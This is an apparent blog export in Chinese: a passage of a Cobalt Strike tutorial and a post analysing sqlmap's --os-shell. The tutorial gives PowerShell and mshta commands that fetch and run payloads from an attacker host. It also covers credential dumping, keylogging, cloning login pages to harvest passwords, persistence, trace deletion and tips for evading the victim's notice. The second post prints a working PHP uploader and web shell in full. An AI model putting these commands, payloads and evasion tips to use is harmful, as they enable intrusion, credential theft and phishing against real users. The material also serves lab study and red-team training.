Macro # 生成office宏病毒文件[+] Payload Generator # 生成各种语言版本的payload[+] USB/CD AutoPlay # 生成利用自动播放运行的木马文件[+] Windows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)[+] Windows Executable # 生成可执行exe木马[+] Windows Executable(Stageless) # 生成无状态的可执行exe木马 （2）Web Drive-by[+] Manage # 对开启的web服务进行管理[+] Clone Site # 克隆网站，可以记录受害者提交的数据[+] Host File # 提供文件下载，可以选择Mime类型[+] Scripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery [+] Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时)[+] Smart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)[+] System Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等[+] Spear Phish # 鱼叉钓鱼邮件 4、Reporting[+] Activity Report # 活动报告[+] Hosts Report # 主机报告[+] Indicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes[+] Sessions Report # 会话报告[+] Social Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录[+] Tactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略[+] Reset Data # 重置数据[+] Export Data # 导出数据，导出.tsv文件格式 5、Help[+] Homepage # 官方主页[+] Support # 技术支持[+] Arsenal # 开发者[+] System information # 版本信息[+] About # 关于 6、工具栏 1.新建连接2.断开当前连接3.监听器4.改变视图为Pivot Graph(视图列表)5.改变视图为Session Table(会话列表)6.改变视图为Target Table(目标列表)7.显示所有已获取的受害主机的凭证8.查看已下载文件9.查看键盘记录结果10.查看屏幕截图11.生成无状态的可执行exe木马12.使用java自签名的程序进行钓鱼攻击13.生成office宏病毒文件14.为payload提供web服务以便下载和执行15.提供文件下载，可以选择Mime类型16.管理Cobalt Strike上运行的web服务17.帮助18.关于 四、基本流程1、创建监听器点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了8个Listener [+] Beacon DNS[+] Beacon HTTP[+] Beacon HTTPS[+] Beacon SMB[+] Beacon TCP[+] External C2[+] Foreign HTTP[+] Foreign HTTPS 其中 Beacon_xx 为内置监听器，包括DNS、HTTP、HTTPS、SMB、TCP五种方式的监听器；Foreign系列为外部监听器，通常与Metasploit或者Armitage联动。 Name任意，选择所需的payload，Host为本机IP，port为没有被占用的任意端口点击save即创建成功 2、生成木马这里选择其中一种攻击方式作示范，后面再做详细解释： 点击Attacks-&gt;Packages-&gt;HTML Application，选择对应的监听器，方法这里有三种(executable/VBA/powershell)，选择powershell，点击Generate生成，选择生成的路径及文件名保存即可。 3、开启Web服务点击Attacks-&gt;Web Drive-by-&gt;Host File，选择刚刚生成的木马evil.hta，点击Launch生成下载链接 4、运行木马打开受害机cmd，运行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。 mshta http://192.168.100.117:8080/download/file.ext 返回CS即可看到肉鸡上线 选中受害机右击，选择interact，即可进行交互，由于受害机默认60秒进行一次回传，为了实验效果我们这里把时间设置成5，但实际中频率不宜过快，容易被发现。 或者在这里更改心跳时间 备注：beacon的命令执行功能较少用起来不方便，可以使用Ladon脚本。 Ladon脚本下载地址：https://github.com/k8gege/Ladon Ladon具体使用方法：https://github.com/k8gege/Aggressor 这里再顺嘴提一句另外的生成和利用木马方法：Attacks——Web Driver-by——Scripted Web Delivery（S） powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.100.117:80/a&#x27;))&quot; 5、提权如果使用的是其他payload比如 Windows Executable，那么可以提权 往监听器生成exe木马 靶机启动exe 成功上线 在上线主机右键后，点击提权，选择uac提权。 成功后会出现一个新的主机。之后的操作可以在新的主机进行。但遗憾的是这里提权失败了 尝试使用svc提权也失败…..这里就不纠结成功与否的问题了，懂得有提权这个功能即可 6、导出报告点击Reporting-&gt;Activity Report，导出默认PDF文档 五、Beacon当受害机上线以后，右击选择Interact，就可以打开Beacon Console 在beacon处输入help可以看到命令说明 Beacon Commands=============== Command Description ------- ----------- argue 进程参数欺骗 blockdlls 在子进程中阻止非Microsoft的DLLs文件 browserpivot 注入受害者浏览器进程 bypassuac 绕过UAC cancel 取消正在进行的下载 cd 切换目录 checkin 强制让被控端回连一次 clear 清除beacon内部的任务队列 connect 通过TCP连接到Beacon covertvpn 部署Covert VPN客户端 cp 复制文件 dcsync 从DC中提取密码哈希 desktop 远程VNC dllinject 反射DLL注入进程 dllload 使用LoadLibrary将DLL加载到进程中 download 下载文件 downloads 列出正在进行的文件下载 drives 列出目标盘符 elevate 尝试提权 execute 在目标上执行程序(无输出) （执行execute notepad后，用户只能在任务管理器等后台查看到进程） execute-assembly 在目标上内存中执行本地.NET程序 exit 退出beacon getprivs 对当前令牌启用系统权限 getsystem 尝试获取SYSTEM权限 getuid 获取用户ID hashdump 转储密码哈希值 help 帮助 inject 在特定进程中生成会话（如果木马依然在内存中运行，那么用户尝试删除时会发现运行中无法删除导致引起疑心，因此获取shell后最好把木马注入到(系统)进程） jobkill 杀死一个后台任务 jobs 列出后台任务 kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话 keylogger 键盘记录 kill 结束进程 link 通过命名管道连接到Beacon logonpasswords 使用mimikatz转储凭据和哈希值 ls 列出文件 make_token 创建令牌以传递凭据 mimikatz 运行mimikatz mkdir 创建一个目录 mode dns 使用DNS A作为通信通道(仅限DNS beacon) mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon) mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon) mode http 使用HTTP作为通信通道 mv 移动文件 net net命令 note 给当前目标机器备注 portscan 进行端口扫描 powerpick 通过Unmanaged PowerShell执行命令 powershell 通过powershell.exe执行命令 powershell-import 导入powershell脚本 ppid 为生成的post-ex任务设置父PID ps 显示进程列表 psexec 使用服务在主机上生成会话 psexec_psh 使用PowerShell在主机上生成会话 psinject 在特定进程中执行PowerShell命令 pth 使用Mimikatz进行传递哈希 pwd 当前目录位置 reg 查询注册表 rev2self 恢复原始令牌 rm 删除文件或文件夹 rportfwd 端口转发 run 在目标上执行程序(返回输出) runas 以另一个用户权限执行程序 runasadmin 在高权限下执行程序 runu 在另一个PID下执行程序 screenshot 屏幕截图 setenv 设置环境变量 shell cmd执行命令 shinject 将shellcode注入进程 shspawn 生成进程并将shellcode注入其中 sleep 设置睡眠延迟时间 socks 启动SOCKS4代理 socks stop 停止SOCKS4 spawn 生成一个会话 spawnas 以其他用户身份生成会话 spawnto 将可执行程序注入进程 spawnu 在另一个PID下生成会话 ssh 使用ssh连接远程主机 ssh-key 使用密钥连接远程主机 steal_token 从进程中窃取令牌 timestomp 将一个文件时间戳应用到另一个文件 unlink 断开与Beacon的连接 upload 上传文件 wdigest 使用mimikatz转储明文凭据 winrm 使用WinRM在主机上生成会话 wmi 使用WMI在主机上生成会话 可用help+命令的方式查看具体命令参数说明 beacon&gt; help argueUse: argue [command] [fake arguments] argue [command] argueSpoof [fake arguments] for [command] processes launched by Beacon.This option does not affect runu/spawnu, runas/spawnas, or post-ex jobs.Use argue [command] to disable this feature for the specified command.Use argue by itself to list programs with defined spoofed arguments. 之前说过CS与受害机默认60s进行一次交互，为了方便实验我们可以把时间设置为0 beacon&gt;sleep 0 获取到Beacon后 Interact 打开beaconAccess dumphashes 获取hash Elevate 提权 GoldenTicket 生成黄金票据注入当前会话 MAketoken 凭证转换 RunMimikatz 运行Mimikatz SpawnAs 用其他用户生成CobaltStrike侦听器Explore BrowserPivot 劫持目标浏览器进程 Desktop(VNC) 桌面交互 FileBrowser 文件浏览器 NetView 命令Net View Portscan 端口扫描 Processlist 进程列表 Screenshot截图Pivoting SOCKSServer 代理服务 Listener 反向端口转发 DeployVPN 部署VPNSpawn 新的通讯模式并生成会话Session 会话管理 备注，删除，心跳时间，退出 下面我就介绍一下几个常用的命令 1、browserpivotBrowser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。 假设受害者在通过IE浏览器登录了网站后台 我们可以通过ps找到浏览器进程，然后通过命令进行注入 beacon&gt; browserpivot 2600 x86 这里之所以选择PID 2600是因为我们需要插入Internet Explorer以继承用户的已验证Web会话。IE的新版本会为每个选项卡生成一个进程，我们必须将其插入子选项卡以继承会话状态。通常，子选项卡共享所有会话状态。通过查看PPID值来标识IE子选项卡进程，当PPID引用explorer.exe时，该进程不是子选项卡；当PPID引用iexplore.exe时，该进程就是子选项卡。 当然这里也可以通过图形界面注入，右击选中Explore-&gt;Browser Pivot 然后浏览器设置代理为黑客主机即本机 然后访问受害者所访问的网页，发现无需登录直接进入后台 2、Socks代理开启socks4a代理，通过代理进行内网渗透 开启socks，可以通过命令，也可以通过右键Pivoting-&gt;SOCKS Server beacon&gt; socks 2222[+] started SOCKS4a server on: 2222[+] host called home, sent: 16 bytes 然后vim /etc/proxychains.conf，在文件末尾添加socks4代理服务器 使用proxychains代理扫描内网主机 proxychains nmap -sP 192.168.183.0/24 我们还可以通过隧道将整个msf带进目标内网 点击View-&gt;Proxy Pivots，选择Socks4a Proxy，点击Tunnel： setg Proxies socks4:192.168.183.147:2222 打开msf对内网进行扫描 关闭socks beacon&gt;socks stop 3、powershell-import这个功能在后渗透测试中很有用，可以导入各种powershell渗透框架，如Nishang、PowerSploit攻击框架 在beacon shell输入powershell-import，导入已有的ps文件 beacon&gt; powershell-import 关于具体有哪些命令可以操作可以查看一下相应ps文件 六、附录爆破cobalt strike密码脚本：https://github.com/ryanohoro/csbruter 七、与MSF联动Kali IP：172.16.20.18 受害者机器：172.16.20.20 CS：172.16.20.19 1、在MSF中创建监听器msf5 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httppayload =&gt; windows/meterpreter/reverse_httpmsf5 exploit(multi/handler) &gt; set lhost 172.16.20.18lhost =&gt; 172.16.20.18msf5 exploit(multi/handler) &gt; set lport 3333lport =&gt; 3333msf5 exploit(multi/handler) &gt; run 注：监听器监听kali自身地址。 2、在CS中设置新的监听地址 注意：payload要与msf中的payload要一致。 在控制中右键–增加会话，选择msf的会话。 此时拿到meterpreter。 输入shell，进入主机命令操作。 八、Aggressor Script1、Sleep环境的搭建Aggressor Script：是C2 3.0以上版本的一个内置的脚本语言，他是由Sleep脚本解析，Sleep脚本目前国内是没有中文版本的，可能是因为使用的人不多 Sleep语言下载地址：http://sleep.dashnine.org/download/sleep.jar 快速使用： java -jar sleep.jar 输出hello world：新建一个cna文件，cna是Aggressor Scrip脚本的后缀，然后在里面写： println(&quot;hello word&quot;); 然后加载一下 2、简介在 C2 中，我们可以打开 Aggressor Script的控制台 这里我们可以使用 help查看一些帮助信息： 下面是介绍： （1）？？进行一个简单的判断，返回值为True或者False，例如 ? int(1) == int(2) 返回为False （2）ee 执行我们写的代码，相当于交互模式，如果不加上 e 的话是无法执行的，例如 e println(&quot;hello world&quot;)： （3）help这个就是显示帮助信息，我们在开头使用过 （4）loadload加载cna脚本，这里我加载一个脚本：load &lt;cna path&gt; 这里加载的 cna 内容为： command w&#123; println(&quot;hello world!&quot;);&#125; 意思是创建一个 command 名字为 w，当输入w的时候就打印hello word。 （5）ls显示我们目前加载的cna代码 （6）proff禁止cna脚本运行Sleep的语法（不明白具体的作用） （7）profile统计cna脚本使用了哪些Sleep语法 （8）pron运行cna脚本运行Sleep的语法 （9）reload重新加载cna脚本，还是用我刚刚的cna脚本举例，我先修改cna中的内容 command w&#123; println(&quot;hello friend!&quot;);&#125; 再到控制台输出一下 没有改变，我再重载一下再运行 （10）troff关闭函数跟踪，也就是我们不显示函数运行的具体情况 （11）tron开启函数跟踪，显示我们运行时的具体情况 发现我们运行的情况，在t1.cna的第二行，我们输出hello friend （12）x执行一个计算，比如1 + 1什么的，这里需要注意，两个数字之间需要间隔开，不然会报错 3、使用不带GUI的C2我们可以使用agscript 运行一个不使用GUI的C2客户端，简单来说就是命令行的操作 服务器上启动后，在本地输入 ./agscript [host] [port] [user] [password] 4、Sleep快速入门这是他的数据类型，首先我们要注意的是，他的格式是一定需要带上空格的。 数字字符串ArraysListsStacksSetsHashs$name = &quot;kris&quot;; # 字符串变量的命名$age = 18; # 数字型变量命名Arrays类型：@user_list = @(&quot;kris&quot;,18,&quot;四川&quot;,&quot;单身&quot;); # Sleep的阵列（列表）是类似python的那种任何元素的集合，不需要元素的类型统一，即也是一种复合数据类型。println(@name_list[0]); # 下标输出信息 Hashs类型%dict[&quot;name&quot;] = &quot;kris&quot;;%dict[&quot;age&quot;] = 18;%dict[&quot;address&quot;] = &quot;sichuan&quot;; # 使用%号创建，有点和python的字典类似 println(&quot;Dict is &quot;.%dict); （1）Arrays@arr1 = @(&#x27;a1&#x27;,&#x27;a2&#x27;,887);println(@arr1[1]); （2）Hashs$x = 2;%dic[&quot;key1&quot;] = &quot;value1&quot;;%dic[&quot;key2&quot;] = &quot;value2&quot;;%dic[$x] = &quot;value3&quot;;println(&quot;%dic is&quot;.%dic); （3）遍历@name_list = @(&#x27;kris&#x27;,18,&#x27;sichuan&#x27;);foreach $var (@name_list)&#123; println($var);&#125; （4）Push这个类似我们的Python中的append方法，在列表的最后面添加数据 @names = @(&quot;Hellen&quot;,&quot;Abao&quot;);push(@names,&quot;kris&quot;);println(&quot;name :&quot;.@names); （5）简单的交互程序首先先看代码 sub say_hello&#123; println(&quot;hello &quot;.$1);# 定义一个函数，打印hello + 得到的参数&#125;command N &#123; say_hello($1); # 定义一个命令，并且将接受到的第一个参数传递给 say_hello函数。&#125; 首先介绍定义函数的方式，在Sleep中，我们使用 sub 进行函数的定义，比如我们定义一个加法函数： sub add &#123; return $1.&quot;+&quot;.$2.&quot;=&quot;.($1 + $2);&#125;$sum = add(1,2);println($sum); command定义命令 语法： command &lt;你想要的命令&gt; &#123; 执行的代码; &#125; 这里是我们使用我们自定义的函数进行交互的，在上面我们是使用的 N 去执行 say_hello的函数体，我们现在只使用一个 command 起到相同的作用： command N &#123; println(&quot;hello &quot;.$1);&#125; 这里说明，我们可以直接写函数，也可以调用$1 是我们接受到的第一个参数，以此类推：$2是第二个参数…… （6）彩色输出简单的来说就是让我们的控制台输出一个带颜色的字体： println(&quot;\\c0This is my color&quot;);println(&quot;\\c1This is my color&quot;); # 这是黑色println(&quot;\\c2This is my color&quot;);println(&quot;\\c3This is my color&quot;);println(&quot;\\c4This is my color&quot;);println(&quot;\\c5This is my color&quot;);println(&quot;\\c6This is my color&quot;);println(&quot;\\c7This is my color&quot;);println(&quot;\\c8This is my color&quot;);println(&quot;\\c9This is my color&quot;);println(&quot;\\cAThis is my color&quot;);println(&quot;\\cBThis is my color&quot;);println(&quot;\\cCThis is my color&quot;);println(&quot;\\cDThis is my color&quot;);println(&quot;\\cEThis is my color&quot;);println(&quot;\\cFThis is my color&quot;); 5、键盘快捷键语法： bind &lt;想绑定的组合键&gt; &#123; 按下快捷键执行的命名; &#125; 我们绑定一个来试试看： bind Ctrl+H &#123; show_message(&quot;使用键盘快捷键哦！&quot;); # 弹窗显示我们的消息 elog(&quot;使用了快捷键！&quot;); # 在 Event Log位置显示信息&#125; 当我们 按下 Ctrl + H 的组合键的时候，我们就直接弹出信息，并且按照代码一样在 Event log下输出，组合键可以随便写，你也可以只写一个 H，都是可以的，加上 Ctrl只是约定俗，也可以使用对个修饰符，比如 Ctrl + Shift + H。 6、菜单编写菜单就是下面这样的东西： 我们可以自己定义想要的菜单或者将我们的二级菜单添加到已经存在的主菜单下，创建自定义菜单语法如下： popup &lt;菜单函数名&gt;&#123; item(&quot;&amp;&lt;二级菜单显示&gt;&quot;, &#123;点击时执行的代码，或者函数&#125;); # 第一个子菜单 separator(); #分割线 item(&quot;&amp;&lt;二级菜单名字&gt;&quot;, &#123;点击时执行的代码，或者函数&#125;); # 第二个子菜单 separator(); #分割线&#125;menubar(&quot;一级菜单显示名&quot;, &quot;菜单函数名&quot;); 我们现在定义一个简单的菜单 popup my_help&#123; item(&quot;&amp;这是百度&quot;,&#123;url_open(&quot;http://www.baidu.com&quot;)&#125;); separator(); item(&quot;&amp;这是谷歌&quot;,&#123;url_open(&quot;http://www.google.com&quot;)&#125;); # url_open()这个函数是用来打开网站的 &#125;menubar(&quot;帮助菜单&quot;, &quot;my_help&quot;); # 菜单函数，一定要加上 当我们点击以后，会直接打开百度的链接： 如果我们并不想创建新的菜单，而是想在默认的菜单上增加，我们可以这样做： popup help&#123; item(&quot;&amp;关于汉化&quot;,&#123;show_message(&quot;4.1汉化 by XXX &quot;)&#125;); separator();&#125; 这样我们就在与原有的基础上加上了一个关于汉化的提示，这里我们是加载外部的 cna ，你可以修改默认的 default.cna来添加自己的信息。 除了上面说的那样的菜单，我们还会在点击右键的时候打开菜单，如下所示： 创建这样的菜单我们的语法为： popup beacon_bottom&#123; item(&quot;&amp;关于作者&quot;, &#123; url_open(&quot;https://wolke.cn&quot;); &#125;); &#125; 我们在任何的菜单里面都可以嵌套菜单，就整出一个多级菜单的样子，我们把上面的代码进行修改 popup beacon_bottom&#123; menu &quot;关于作者&quot;&#123; item(&quot;&amp;博客&quot;, &#123; url_open(&quot;https://wolke.cn&quot;); &#125;); item(&quot;&amp;QQ&quot;, &#123; show_message(&quot;xxxxxx&quot;); &#125;); &#125; &#125; 多级菜单就是多了一个menu “右键显示的信息”{} 的写法，这里和上面菜单编写最大的区别就是没有menubar的写法，因为我们是直接在右键菜单上进行修改的，也就是原有菜单上修改 7、输出框的编写在一些时候，我们想整一个输入框。让用户输入一些东西的时候，可以使用 dialog 数据模型进行编写，他需要接受三个参数 $1 对话框的名称 $2 对话框里面的内容，可以写多个 $3 回调函数，当用户使用 dbutton_action 调用的函数 popup test &#123; item(&quot;&amp;收集信息&quot;,&#123;dialog_test()&#125;); # 建立一个菜单栏目，点击收集信息时就调用show函数&#125;menubar(&quot;测试菜单&quot;,&quot;test&quot;); # 注册菜单sub show &#123; show_message(&quot;dialog的引用是：&quot;.$1.&quot;\\n按钮名称是：&quot;.$2); println(&quot;用户名是：&quot;.$3[&quot;user&quot;].&quot;\\n密码是：&quot;.$3[&quot;password&quot;]);# 这里show函数接收到了dialog传递过来的参数，分&#125;sub dialog_test &#123; $info = dialog(&quot;这是对话框的标题&quot;,%(username =&gt; &quot;root&quot;,password =&gt; &quot;&quot;),&amp;show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他 drow_text($info,&quot;user&quot;,&quot;输入用户名：&quot;); # 设置一个用户名输入条 drow_text($info,&quot;password&quot;,&quot;输入密码&quot;); dbutton_action($info,&quot;马上起飞！&quot;); # 点击按钮，触发回调函数 dbutton_help($info,&quot;https://wolke.cn&quot;); # 显示帮助信息 dialog_show($info); # 显示文本输入框&#125; 定义 diolog 的时候，会将用户输入的东西传递给第三个参数设置的函数，dialog传递的时候一共会传递三个参数给函数 $1 为 dialog的引用 $2 按钮的名称 $3对话框输入的值 drow_text是指文对话框的输入，语法如下： drow_text(&quot;变量名&quot;,&quot;提示语句&quot;); dbutton_action 将操作按钮添加到dialog 中，当点击这个按钮以后，会关闭对话框，并且传输数据到回调函数中 dbutton_action($info,&quot;按钮的名字&quot;) dbutton_help 将help按钮添加到对话框中，点击help跳转网页去 dbutton_help($info,&quot;https://wolke.cn&quot;) dialog_show 显示对话框 8、数据接口 Mode Function 含义 targets 存储的目标信息 显示上线过的主机信息 archives 显示最近的信息 显示最近的输出信息（慎用很卡） beacons 显示所有的受感染的主机信息 显示在线和上线过的主机 credentials 显示凭据信息 我们抓取过的密码信息和制作的票据信息 downloads 显示下载信息 显示我们在受控端下载的信息 keystrokes 记录键盘输入 当我们选择进程记录键盘的时候，会将得到的键盘信息记录下来 screenshots 屏幕截图显示 显示我们截图的二进制信息流 sites 托管的资产 看起来是我们创建的监听的端口个Stager回连的端口 servers 上面的这些数据结构（可以理解为函数）使用他们可以返回对应的信息，以数组的形式返回，我们可以通过 Aggressor Script的控制台进行查看，例如： 支持下标索引： 字典的操作也可以 我们可以写一个 cna 来获取当前主机的信息： command info&#123; println(&quot;IP地址：&quot;.targets()[$1][&quot;address&quot;].&quot;\\n操作系统：&quot;.targets()[$1][&quot;os&quot;].&quot;\\n用户名：&quot;.targets()[$1][&quot;name&quot;]);&#125; 九、制作钓鱼网站1、寻找网站模板找有登录框的或者你想克隆的网站 2、CS克隆网站，并开始输入监听 填写克隆地址，勾选键盘监听 3、访问测试在钓鱼页面输入账号密码 点击登录后，其实是往真实的页面提交账号密码，如果输入正确，则进入后台，输入错误，回到登录页面（如下图） 看到用户输入的账号密码 十、权限维持如果此时我已经控制了电脑，但由于木马运行在内存中，当用户删除该文件时会报错无法删除，容易暴露。而且当用户重启电脑时，也会断开控制，此时就需要进行权限维持，而这里我们通过服务进行权限维持 1、创建可执行文件创建可执行文件可以在 Cobalt Strike 的 Attack -&gt; Packages -&gt; Windows Executable(s) 处进行创建，创建一个w01ke.exe文件 如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。 2、上传可执行文件首先使用 Cobalt Strike 上的 upload 功能上传文件，接着复制文件到目标主机的其他位置。 beacon&gt; cd c:\\windows\\tempbeacon&gt; upload /root/w01ke.exe[*] Tasked beacon to upload /home/kali/w01ke.exe as w01ke.exe[+] host called home, sent: 289301 bytes 3、执行文件（1）方法一：服务权限维持① 生成Windows Service EXE并上传就是上面生成的exe，继续即可 ② 在目标主机上创建一个服务beacon&gt; shell sc [\\\\用户名] create &quot;thisserver&quot; binpath= &quot;c:\\windows\\temp\\w01ke.exe&quot;等号和值之间需要有个空格 另外还可以修改服务描述 beacon&gt; shell sc [\\\\用户名] description &quot;thisserver&quot; &quot;zhe shi fu wu&quot; ③ 设置开机自启动beacon&gt; shell sc [\\\\用户名] config &quot;thisserver&quot; start= auto ④ 在目标机启动服务beacon&gt; shell sc start thisserver或者beacon&gt; shell net start thisserver 此时就会有个新目标上线 ⑤ 清除旧木马 becon.exebeacon&gt; shell del C:\\Users\\Administrator\\Desktop\\beacon.exe[*] Tasked beacon to run: del C:\\Users\\Administrator\\Desktop\\beacon.exe[+] host called home, sent: 76 bytes ⑥ 验证开机自启服务此时重启目标机器，有新连接 ⑦ 清除痕迹与服务beacon&gt; shell del C:\\windows\\temp\\w01ke.exe[*] Tasked beacon to run: del C:\\windows\\temp\\w01ke.exe[+] host called home, sent: 83 bytesbeacon&gt; shell sc delete &quot;thisserver&quot;[*] Tasked beacon to run: sc delete &quot;thisserver&quot;[+] host called home, sent: 69 bytes[+] received output:[SC] DeleteService 成功 （2）方法二：计划任务维持① 生成Windows EXE并上传注意这里生成的 EXE 和方法一生成的 EXE 是不一样的类型，这里生成的是Windows EXE，不是方法一中的Windows Service EXE。 上传后将w01ke2.exe移动到c:\\windows\\temp\\目录下 ② 找到目标系统上的时间beacon&gt; shell net time[*] Tasked beacon to run: net time[+] host called home, sent: 39 bytes[+] received output:找不到时间服务器。请键入 NET HELPMSG 3912 以获得更多的帮助。beacon&gt; shell net start &quot;windows time&quot;[*] Tasked beacon to run: net start &quot;windows time&quot;[+] host called home, sent: 55 bytes[+] received output:请求的服务已经启动。请键入 NET HELPMSG 2182 以获得更多的帮助。 不懂开了但是还是不行。这里就当作开了，知道了时间为2022/02/18吧 ③ 创建一个计划任务beacon&gt; shell at 2:02 c:\\windows\\temp\\w01ke2.exe[*] Tasked beacon to run: at 2:02 c:\\windows\\temp\\w01ke2.exe[+] host called home, sent: 65 bytes[+] received output:新加了一项作业，其作业 ID = 1 ④ 验证当到了规定时间后，目标机器上线 十一、CS正向连接多层内网这是源自网络上的一张概念图，大致原理如图所示 首先跳板机上已经有了 cs 的后门，通过后门查看网络信息发现存在 172.16.214.0/24 网段，跳板机拥有双网卡是可以访问内网主机的，所以在 CS 中可以通过跳板机访问内网主机 生成监听器，选择Beacon TCP 生成后门 windows executable(s) 将后门复制到内网主机(172.16.214.141)上并执行 在 cs 中进入会话 beacon，使用命令连接内网主机 connect 172.14.214.141 4444 十二、CS反向连接多层内网使用正向连接很可能因为内网防火墙的存在遭到拦截而连接失败，此时可以使用反向连接突破防火墙的拦截 在选择做代理的会话选择 listener，即跳板机的会话 新建监听器 创建后门 选择带有 s 的选项，在 listener 选择刚刚创建的监听器 在内网主机上执行后门 执行后，后门会主动连接到跳板机，cs 即会上线 十三、参考链接 https://blog.csdn.net/weixin_44677409/article/details/102725129 https://www.freebuf.com/articles/web/255876.html https://zhuanlan.zhihu.com/p/359251293 https://www.mrwu.red/fenxiang/3673.html https://wiki.wgpsec.org/knowledge/intranet/Aggressor-script.html","categories":[{"name":"安全工具/安全开发","slug":"安全工具-安全开发","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"内网安全","slug":"内网安全","permalink":"https://wolke.cn/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Sqlmap的--os-shell原理","slug":"Sqlmap的-os-shell原理","date":"2022-02-15T14:56:28.000Z","updated":"2022-02-15T15:07:44.362Z","comments":true,"path":"post/409cdb09.html","link":"","permalink":"https://wolke.cn/post/409cdb09.html","excerpt":"","text":"&emsp;&emsp;最近也是在研究sqlmap，感觉–os-shell这个命令确实很厉害，但我并不知它的原理，所以来研究一下 一、环境 操作系统：Win10 脚本语言：PHP 5.3.29 Web容器：Apache 2.4.39 数据库：Mysql 5.7.26 二、简单测试&emsp;&emsp;利用sqlmap进行注入检测 sqlmap -u &quot;http://192.168.100.119/sql_injection/sqlilabs/Less-1/index.php?id=1&quot; --batch sqlmap -u &quot;http://192.168.100.119/sql_injection/sqlilabs/Less-1/index.php?id=1&quot; --os-shell &emsp;&emsp;选择语言，sqlmap默认为php，此处根据需求选择 &emsp;&emsp;输入绝对路径 &emsp;&emsp;上传文件 &emsp;&emsp;建立os shell然后命令执行 &emsp;&emsp;断开shell，清除上传的文件 这个时候sqlmap主要做了三件事 进行目标的一个基础信息的探测 上传shell到目标web网站上 退出时删除shell 三、原理分析&emsp;&emsp;WireShark捕获数据包，只查看http数据包。 1、sqlmap上传一个具有上传功能的马&emsp;&emsp;Sqlmap使用into outfile函数将一个具有上传功能的php文件写到当前网站根目录下 &emsp;&emsp;追踪http流可以看到内容被url编码了，解开后可以看到是通过into outfile进行文件的写入。&emsp;&emsp;马的内容进行了16进制编码，解开后查看代码就可以发现是一个上传功能的马。 1 Dumb Dumb&lt;?phpif (isset($_REQUEST[&quot;upload&quot;])) &#123; $dir=$_REQUEST[&quot;uploadDir&quot;]; if (phpversion()&lt;&#x27;4.1.0&#x27;) &#123; $file=$HTTP_POST_FILES[&quot;file&quot;][&quot;name&quot;]; @move_uploaded_file($HTTP_POST_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$dir.&quot;/&quot;.$file) or die(); &#125; else &#123; $file=$_FILES[&quot;file&quot;][&quot;name&quot;]; @move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$dir.&quot;/&quot;.$file) or die(); &#125; @chmod($dir.&quot;/&quot;.$file,0755); echo &quot;File uploaded&quot;;&#125; else &#123; echo &quot;&lt;form action=&quot;.$_SERVER[&quot;PHP_SELF&quot;].&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\\\\phpstudy_pro\\\\WWW\\\\sql_injection\\\\sqlilabs\\\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;;&#125;?&gt; 2、通过上传的马进行shell的上传&emsp;&emsp;追踪http流可以看到body为shell的内容。 &lt;?php $c=$_REQUEST[&quot;cmd&quot;];@set_time_limit(0);@ignore_user_abort(1);@ini_set(&quot;max_execution_time&quot;,0);$z=@ini_get(&quot;disable_functions&quot;);if(!empty($z)) &#123; $z=preg_replace(&quot;/[, ]+/&quot;,&#x27;,&#x27;,$z); $z=explode(&#x27;,&#x27;,$z); $z=array_map(&quot;trim&quot;,$z);&#125; else &#123; $z=array();&#125;$c=$c.&quot; 2&gt;&amp;1\\n&quot;;function f($n) &#123; global $z; return is_callable($n)and!in_array($n,$z);&#125;if(f(&quot;system&quot;)) &#123; ob_start(); system($c); $w=ob_get_clean();&#125; elseif(f(&quot;proc_open&quot;)) &#123; $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t); $w=NULL; while(!feof($t[1])) &#123; $w.=fread($t[1],512); &#125; @proc_close($y);&#125; elseif(f(&quot;shell_exec&quot;)) &#123; $w=shell_exec($c);&#125; elseif(f(&quot;passthru&quot;)) &#123; ob_start(); passthru($c); $w=ob_get_clean();&#125; elseif(f(&quot;popen&quot;)) &#123; $x=popen($c,r); $w=NULL; if(is_resource($x)) &#123; while(!feof($x)) &#123; $w.=fread($x,512); &#125; &#125; @pclose($x);&#125; elseif(f(&quot;exec&quot;)) &#123; $w=array(); exec($c,$w); $w=join(chr(10),$w).chr(10);&#125; else &#123; $w=0;&#125;echo&quot;&lt;pre&gt;$w&lt;/pre&gt;&quot;;?&gt; 